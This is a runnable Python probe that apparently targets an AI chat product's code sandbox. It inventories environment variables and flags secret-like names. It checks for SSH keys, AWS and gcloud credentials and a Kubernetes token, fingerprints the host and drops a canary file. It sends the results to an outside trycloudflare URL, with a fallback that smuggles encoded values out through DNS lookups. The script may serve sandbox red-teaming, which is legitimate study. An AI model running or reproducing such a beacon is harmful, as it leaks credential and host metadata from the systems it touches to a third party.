import base64
import hashlib
import json
import os
import platform
import socket
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request

NONCE = "6192d812212fe20d9346ecb5169e1d33"
ENDPOINT = "https://david-charged-dem-currently.trycloudflare.com/ingest"
VENDOR = "doubao"
MODE = "chat"
CONFIG = "fast"
RUN_ID = "doubao-chat-fast-6192d812"
DNS_DOMAIN = "probe.example.org"
STAGE = "turn"

POST_TIMEOUT = 4
DNS_TIMEOUT = 2
HEARTBEAT_SECONDS = 5
MAX_READ_BYTES = 65536


def sha256_hex(data):
    return hashlib.sha256(data).hexdigest()


def sha256_short(data):
    return sha256_hex(data)[:16]


def self_hash():
    if not hasattr(self_hash, "v"):
        self_hash.v = sha256_hex(open(__file__, "rb").read())
    return self_hash.v


def now_iso():
    return time.strftime("%Y-%m-%dT%H:%M:%S%z")


def read_bytes(path, limit=MAX_READ_BYTES):
    try:
        with open(path, "rb") as f:
            return f.read(limit)
    except Exception:
        return None


def read_text(path, limit=MAX_READ_BYTES):
    b = read_bytes(path, limit)
    if b is None:
        return None
    return b.decode("utf-8", "replace")


def run_bytes(cmd, timeout=5):
    try:
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = p.communicate(timeout=timeout)
        return p.returncode, out or b"", err or b""
    except Exception as e:
        return -1, b"", repr(e).encode("utf-8", "replace")


def run_text(cmd, timeout=5):
    rc, out, err = run_bytes(cmd, timeout)
    return rc, out.decode("utf-8", "replace"), err.decode("utf-8", "replace")


def boot_id():
    v = read_text("/proc/sys/kernel/random/boot_id")
    return (v or "").strip()


def machine_id():
    v = read_text("/etc/machine-id")
    if not v:
        v = read_text("/var/lib/dbus/machine-id")
    return (v or "").strip()


def hostname():
    return platform.node()


def instance_fp():
    if not hasattr(instance_fp, "v"):
        instance_fp.v = "|".join([boot_id(), machine_id(), hostname()])
    return instance_fp.v


def make_record(dim, subitem, value, fingerprint="", anchor="A", channel="L1"):
    return {
        "run_id": RUN_ID,
        "vendor": VENDOR,
        "mode": MODE,
        "config": CONFIG,
        "dim": dim,
        "subitem": subitem,
        "value": value,
        "fingerprint": fingerprint,
        "ts": now_iso(),
        "instance_fp": instance_fp(),
        "anchor": anchor,
        "probe_sha": self_hash(),
        "channel": channel,
    }


def post_json(url, payload, timeout=POST_TIMEOUT):
    data = json.dumps(payload, ensure_ascii=False).encode("utf-8")
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent", "probe-channel/1")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return True, resp.status
    except Exception as e:
        return False, repr(e)


def post_envelope(records):
    payload = {"nonce": NONCE, "self_hash": self_hash(), "records": records}
    return post_json(ENDPOINT, payload)


def dns_query(host, timeout=DNS_TIMEOUT):
    result = {"host": host, "ok": False, "detail": ""}

    def worker():
        try:
            socket.getaddrinfo(host, None)
            result["ok"] = True
        except Exception as e:
            result["detail"] = repr(e)

    t = threading.Thread(target=worker, daemon=True)
    t.start()
    t.join(timeout)
    if t.is_alive():
        result["detail"] = "timeout"
    return result


def b32_short(s):
    return base64.b32encode(s.encode("utf-8")).decode("ascii").rstrip("=").lower()[:48]


def dns_beacon(records):
    parts = [RUN_ID, self_hash()[:16], NONCE[:16]]
    for r in records:
        parts.append("%s.%s" % (r["dim"][:6], r["subitem"][:6]))
        if r.get("value"):
            parts.append(b32_short(str(r["value"])[:24]))
    host = ".".join(parts) + "." + DNS_DOMAIN
    return dns_query(host)


def post_with_dns_fallback(records):
    ok, detail = post_envelope(records)
    if ok:
        return {"channel": "L1", "ok": True, "detail": "", "dns": None}
    return {"channel": "L2", "ok": False, "detail": detail, "dns": dns_beacon(records)}

import re


SENSITIVE_NAME = re.compile(r"token|secret|key|password|passwd|credential|cred|private|auth|api[_-]?key|access[_-]?key", re.I)


def collect_secrets():
    records = []
    env_names = sorted(os.environ.keys())
    env_summary = []
    sensitive_hits = []
    for k in env_names:
        v = os.environ[k]
        rec = {"name": k, "len": len(v), "fp": sha256_short(v.encode("utf-8"))}
        env_summary.append(rec)
        if SENSITIVE_NAME.search(k):
            sensitive_hits.append({"name": k, "len": len(v), "fp": sha256_short(v.encode("utf-8"))})
    records.append(make_record("Secrets", "环境变量", json.dumps(env_summary, ensure_ascii=False)))
    records.append(make_record("Secrets", "连接器 token", json.dumps(sensitive_hits, ensure_ascii=False)))

    home = os.path.expanduser("~")
    cred_files = [
        os.path.join(home, ".ssh", "id_rsa"),
        os.path.join(home, ".ssh", "id_ed25519"),
        os.path.join(home, ".aws", "credentials"),
        os.path.join(home, ".config", "gcloud", "credentials.db"),
        "/root/.ssh/id_rsa",
        "/root/.ssh/id_ed25519",
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
    ]
    creds = []
    for p in cred_files:
        b = read_bytes(p)
        if b is not None:
            creds.append({"path": p, "bytes": len(b), "fp": sha256_short(b)})
        else:
            creds.append({"path": p, "bytes": 0, "fp": ""})
    records.append(make_record("Secrets", "短期凭据", json.dumps(creds, ensure_ascii=False)))

    canary_val = "CANARY-%s-%s" % (RUN_ID, NONCE[:8])
    canary_path = "/tmp/probe_canary_%s.txt" % NONCE[:8]
    try:
        with open(canary_path, "w") as f:
            f.write(canary_val)
        canary_status = {"path": canary_path, "fp": sha256_short(canary_val.encode("utf-8")), "written": True}
    except Exception as e:
        canary_status = {"path": canary_path, "written": False, "err": repr(e)}
    records.append(make_record("Secrets", "canary", json.dumps(canary_status, ensure_ascii=False)))
    return records


if __name__ == "__main__":
    post_with_dns_fallback(collect_secrets())
